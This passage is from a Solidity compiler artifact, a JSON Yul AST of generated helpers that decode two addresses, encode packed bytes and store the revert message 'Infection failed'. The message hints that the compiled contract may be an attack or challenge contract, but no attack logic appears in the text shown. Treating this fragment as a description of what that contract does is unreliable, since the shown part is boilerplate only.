																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nativeSrc": "532:24:1",
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:1",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:1",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nativeSrc": "611:79:1",
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:1",
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:1",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:1",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nativeSrc": "670:12:1",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nativeSrc": "670:12:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:1",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:1",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nativeSrc": "641:24:1",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:1",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nativeSrc": "631:35:1",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nativeSrc": "624:43:1",
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nativeSrc": "621:63:1",
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:1",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nativeSrc": "759:80:1",
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nativeSrc": "769:22:1",
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "784:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "778:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nativeSrc": "778:13:1",
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "769:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "827:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "800:26:1",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nativeSrc": "800:33:1",
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nativeSrc": "800:33:1",
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nativeSrc": "696:143:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "737:6:1",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "745:3:1",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "753:5:1",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nativeSrc": "939:413:1",
													"nodeType": "YulBlock",
													"src": "939:413:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "985:83:1",
																"nodeType": "YulBlock",
																"src": "985:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "987:77:1",
																				"nodeType": "YulIdentifier",
																				"src": "987:77:1"
																			},
																			"nativeSrc": "987:79:1",
																			"nodeType": "YulFunctionCall",
																			"src": "987:79:1"
																		},
																		"nativeSrc": "987:79:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "987:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "960:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "960:7:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "969:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "969:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "956:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "956:3:1"
																		},
																		"nativeSrc": "956:23:1",
																		"nodeType": "YulFunctionCall",
																		"src": "956:23:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "981:2:1",
																		"nodeType": "YulLiteral",
																		"src": "981:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "952:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "952:3:1"
																},
																"nativeSrc": "952:32:1",
																"nodeType": "YulFunctionCall",
																"src": "952:32:1"
															},
															"nativeSrc": "949:119:1",
															"nodeType": "YulIf",
															"src": "949:119:1"
														},
														{
															"nativeSrc": "1078:128:1",
															"nodeType": "YulBlock",
															"src": "1078:128:1",
															"statements": [
																{
																	"nativeSrc": "1093:15:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1093:15:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1107:1:1",
																		"nodeType": "YulLiteral",
																		"src": "1107:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1097:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1097:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1122:74:1",
																	"nodeType": "YulAssignment",
																	"src": "1122:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1168:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1168:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1179:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1179:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1164:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1164:3:1"
																				},
																				"nativeSrc": "1164:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1164:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1188:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1188:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1132:31:1",
																			"nodeType": "YulIdentifier",
																			"src": "1132:31:1"
																		},
																		"nativeSrc": "1132:64:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1132:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1122:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1122:6:1"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1216:129:1",
															"nodeType": "YulBlock",
															"src": "1216:129:1",
															"statements": [
																{
																	"nativeSrc": "1231:16:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1231:16:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1245:2:1",
																		"nodeType": "YulLiteral",
																		"src": "1245:2:1",
																		"type": "",
																		"value": "32"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1235:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1235:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1261:74:1",
																	"nodeType": "YulAssignment",
																	"src": "1261:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1307:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1307:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1318:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1318:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1303:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1303:3:1"
																				},
																				"nativeSrc": "1303:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1303:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1327:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1327:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1271:31:1",
																			"nodeType": "YulIdentifier",
																			"src": "1271:31:1"
																		},
																		"nativeSrc": "1271:64:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1271:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value1",
																			"nativeSrc": "1261:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1261:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_address_fromMemory",
												"nativeSrc": "845:507:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "901:9:1",
														"nodeType": "YulTypedName",
														"src": "901:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "912:7:1",
														"nodeType": "YulTypedName",
														"src": "912:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "924:6:1",
														"nodeType": "YulTypedName",
														"src": "924:6:1",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "932:6:1",
														"nodeType": "YulTypedName",
														"src": "932:6:1",
														"type": ""
													}
												],
												"src": "845:507:1"
											},
											{
												"body": {
													"nativeSrc": "1416:40:1",
													"nodeType": "YulBlock",
													"src": "1416:40:1",
													"statements": [
														{
															"nativeSrc": "1427:22:1",
															"nodeType": "YulAssignment",
															"src": "1427:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "1443:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "1443:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "1437:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "1437:5:1"
																},
																"nativeSrc": "1437:12:1",
																"nodeType": "YulFunctionCall",
																"src": "1437:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nativeSrc": "1427:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "1427:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nativeSrc": "1358:98:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1399:5:1",
														"nodeType": "YulTypedName",
														"src": "1399:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nativeSrc": "1409:6:1",
														"nodeType": "YulTypedName",
														"src": "1409:6:1",
														"type": ""
													}
												],
												"src": "1358:98:1"
											},
											{
												"body": {
													"nativeSrc": "1575:34:1",
													"nodeType": "YulBlock",
													"src": "1575:34:1",
													"statements": [
														{
															"nativeSrc": "1585:18:1",
															"nodeType": "YulAssignment",
															"src": "1585:18:1",
															"value": {
																"name": "pos",
																"nativeSrc": "1600:3:1",
																"nodeType": "YulIdentifier",
																"src": "1600:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nativeSrc": "1585:11:1",
																	"nodeType": "YulIdentifier",
																	"src": "1585:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nativeSrc": "1462:147:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "1547:3:1",
														"nodeType": "YulTypedName",
														"src": "1547:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nativeSrc": "1552:6:1",
														"nodeType": "YulTypedName",
														"src": "1552:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nativeSrc": "1563:11:1",
														"nodeType": "YulTypedName",
														"src": "1563:11:1",
														"type": ""
													}
												],
												"src": "1462:147:1"
											},
											{
												"body": {
													"nativeSrc": "1677:77:1",
													"nodeType": "YulBlock",
													"src": "1677:77:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dst",
																		"nativeSrc": "1694:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1694:3:1"
																	},
																	{
																		"name": "src",
																		"nativeSrc": "1699:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1699:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "1704:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "1704:6:1"
																	}
																],
																"functionName": {
																	"name": "mcopy",
																	"nativeSrc": "1688:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "1688:5:1"
																},
																"nativeSrc": "1688:23:1",
																"nodeType": "YulFunctionCall",
																"src": "1688:23:1"
															},
															"nativeSrc": "1688:23:1",
															"nodeType": "YulExpressionStatement",
															"src": "1688:23:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dst",
																				"nativeSrc": "1731:3:1",
																				"nodeType": "YulIdentifier",
																				"src": "1731:3:1"
																			},
																			{
																				"name": "length",
																				"nativeSrc": "1736:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "1736:6:1"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1727:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "1727:3:1"
																		},
																		"nativeSrc": "1727:16:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1727:16:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1745:1:1",
																		"nodeType": "YulLiteral",
																		"src": "1745:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1720:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "1720:6:1"
																},
																"nativeSrc": "1720:27:1",
																"nodeType": "YulFunctionCall",
																"src": "1720:27:1"
															},
															"nativeSrc": "1720:27:1",
															"nodeType": "YulExpressionStatement",
															"src": "1720:27:1"
														}
													]
												},
												"name": "copy_memory_to_memory_with_cleanup",
												"nativeSrc": "1615:139:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nativeSrc": "1659:3:1",
														"nodeType": "YulTypedName",
														"src": "1659:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nativeSrc": "1664:3:1",
														"nodeType": "YulTypedName",
														"src": "1664:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nativeSrc": "1669:6:1",
														"nodeType": "YulTypedName",
														"src": "1669:6:1",
														"type": ""
													}
												],
												"src": "1615:139:1"
											},
											{
												"body": {
													"nativeSrc": "1868:278:1",
													"nodeType": "YulBlock",
													"src": "1868:278:1",
													"statements": [
														{
															"nativeSrc": "1878:52:1",
															"nodeType": "YulVariableDeclaration",
															"src": "1878:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "1924:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "1924:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nativeSrc": "1892:31:1",
																	"nodeType": "YulIdentifier",
																	"src": "1892:31:1"
																},
																"nativeSrc": "1892:38:1",
																"nodeType": "YulFunctionCall",
																"src": "1892:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nativeSrc": "1882:6:1",
																	"nodeType": "YulTypedName",
																	"src": "1882:6:1",
																	"type": ""
																}
															]
														},
														{
															"nativeSrc": "1939:95:1",
															"nodeType": "YulAssignment",
															"src": "1939:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2022:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2022:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "2027:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "2027:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nativeSrc": "1946:75:1",
																	"nodeType": "YulIdentifier",
																	"src": "1946:75:1"
																},
																"nativeSrc": "1946:88:1",
																"nodeType": "YulFunctionCall",
																"src": "1946:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nativeSrc": "1939:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1939:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2082:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "2082:5:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2089:4:1",
																				"nodeType": "YulLiteral",
																				"src": "2089:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2078:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "2078:3:1"
																		},
																		"nativeSrc": "2078:16:1",
																		"nodeType": "YulFunctionCall",
																		"src": "2078:16:1"
																	},
																	{
																		"name": "pos",
																		"nativeSrc": "2096:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2096:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "2101:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "2101:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory_with_cleanup",
																	"nativeSrc": "2043:34:1",
																	"nodeType": "YulIdentifier",
																	"src": "2043:34:1"
																},
																"nativeSrc": "2043:65:1",
																"nodeType": "YulFunctionCall",
																"src": "2043:65:1"
															},
															"nativeSrc": "2043:65:1",
															"nodeType": "YulExpressionStatement",
															"src": "2043:65:1"
														},
														{
															"nativeSrc": "2117:23:1",
															"nodeType": "YulAssignment",
															"src": "2117:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2128:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2128:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "2133:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "2133:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2124:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2124:3:1"
																},
																"nativeSrc": "2124:16:1",
																"nodeType": "YulFunctionCall",
																"src": "2124:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nativeSrc": "2117:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2117:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nativeSrc": "1760:386:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1849:5:1",
														"nodeType": "YulTypedName",
														"src": "1849:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1856:3:1",
														"nodeType": "YulTypedName",
														"src": "1856:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nativeSrc": "1864:3:1",
														"nodeType": "YulTypedName",
														"src": "1864:3:1",
														"type": ""
													}
												],
												"src": "1760:386:1"
											},
											{
												"body": {
													"nativeSrc": "2286:137:1",
													"nodeType": "YulBlock",
													"src": "2286:137:1",
													"statements": [
														{
															"nativeSrc": "2297:100:1",
															"nodeType": "YulAssignment",
															"src": "2297:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "2384:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "2384:6:1"
																	},
																	{
																		"name": "pos",
																		"nativeSrc": "2393:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2393:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nativeSrc": "2304:79:1",
																	"nodeType": "YulIdentifier",
																	"src": "2304:79:1"
																},
																"nativeSrc": "2304:93:1",
																"nodeType": "YulFunctionCall",
																"src": "2304:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nativeSrc": "2297:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2297:3:1"
																}
															]
														},
														{
															"nativeSrc": "2407:10:1",
															"nodeType": "YulAssignment",
															"src": "2407:10:1",
															"value": {
																"name": "pos",
																"nativeSrc": "2414:3:1",
																"nodeType": "YulIdentifier",
																"src": "2414:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nativeSrc": "2407:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2407:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nativeSrc": "2152:271:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "2265:3:1",
														"nodeType": "YulTypedName",
														"src": "2265:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "2271:6:1",
														"nodeType": "YulTypedName",
														"src": "2271:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nativeSrc": "2282:3:1",
														"nodeType": "YulTypedName",
														"src": "2282:3:1",
														"type": ""
													}
												],
												"src": "2152:271:1"
											},
											{
												"body": {
													"nativeSrc": "2525:73:1",
													"nodeType": "YulBlock",
													"src": "2525:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2542:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2542:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "2547:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "2547:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2535:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "2535:6:1"
																},
																"nativeSrc": "2535:19:1",
																"nodeType": "YulFunctionCall",
																"src": "2535:19:1"
															},
															"nativeSrc": "2535:19:1",
															"nodeType": "YulExpressionStatement",
															"src": "2535:19:1"
														},
														{
															"nativeSrc": "2563:29:1",
															"nodeType": "YulAssignment",
															"src": "2563:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2582:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2582:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2587:4:1",
																		"nodeType": "YulLiteral",
																		"src": "2587:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2578:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2578:3:1"
																},
																"nativeSrc": "2578:14:1",
																"nodeType": "YulFunctionCall",
																"src": "2578:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nativeSrc": "2563:11:1",
																	"nodeType": "YulIdentifier",
																	"src": "2563:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nativeSrc": "2429:169:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "2497:3:1",
														"nodeType": "YulTypedName",
														"src": "2497:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nativeSrc": "2502:6:1",
														"nodeType": "YulTypedName",
														"src": "2502:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nativeSrc": "2513:11:1",
														"nodeType": "YulTypedName",
														"src": "2513:11:1",
														"type": ""
													}
												],
												"src": "2429:169:1"
											},
											{
												"body": {
													"nativeSrc": "2710:60:1",
													"nodeType": "YulBlock",
													"src": "2710:60:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nativeSrc": "2732:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "2732:6:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2740:1:1",
																				"nodeType": "YulLiteral",
																				"src": "2740:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2728:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "2728:3:1"
																		},
																		"nativeSrc": "2728:14:1",
																		"nodeType": "YulFunctionCall",
																		"src": "2728:14:1"
																	},
																	{
																		"hexValue": "496e66656374696f6e206661696c6564",
																		"kind": "string",
																		"nativeSrc": "2744:18:1",
																		"nodeType": "YulLiteral",
																		"src": "2744:18:1",
																		"type": "",
																		"value": "Infection failed"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2721:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "2721:6:1"
																},
																"nativeSrc": "2721:42:1",
																"nodeType": "YulFunctionCall",
																"src": "2721:42:1"
															},
															"nativeSrc": "2721:42:1",
															"nodeType": "YulExpressionStatement",
															"src": "2721:42:1"
														}
													]
												},
												"name": "store_literal_in_memory_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524",
												"nativeSrc": "2604:166:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nativeSrc": "2702:6:1",
														"nodeType": "YulTypedName",
														"src": "2702:6:1",
														"type": ""
													}
												],
												"src": "2604:166:1"
											},
											{
												"body": {
													"nativeSrc": "2922:220:1",
													"nodeType": "YulBlock",
													"src": "2922:220:1",
													"statements": [
														{
															"nativeSrc": "2932:74:1",
															"nodeType": "YulAssignment",
															"src": "2932:74:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2998:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2998:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3003:2:1",
																		"nodeType": "YulLiteral",
																		"src": "3003:2:1",
																		"type": "",
																		"value": "16"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nativeSrc": "2939:58:1",
																	"nodeType": "YulIdentifier",
																	"src": "2939:58:1"
																},
																"nativeSrc": "2939:67:1",
																"nodeType": "YulFunctionCall",
																"src": "2939:67:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nativeSrc": "2932:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2932:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "3104:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "3104:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524",
																	"nativeSrc": "3015:88:1",
																	"nodeType": "YulIdentifier",
																	"src": "3015:88:1"
																},
																"nativeSrc": "3015:93:1",
																"nodeType": "YulFunctionCall",
																"src": "3015:93:1"
															},
															"nativeSrc": "3015:93:1",
															"nodeType": "YulExpressionStatement",
															"src": "3015:93:1"
														},
														{
															"nativeSrc": "3117:19:1",
															"nodeType": "YulAssignment",
															"src": "3117:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "3128:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "3128:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3133:2:1",
																		"nodeType": "YulLiteral",
																		"src": "3133:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "3124:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "3124:3:1"
																},
																"nativeSrc": "3124:12:1",
																"nodeType": "YulFunctionCall",
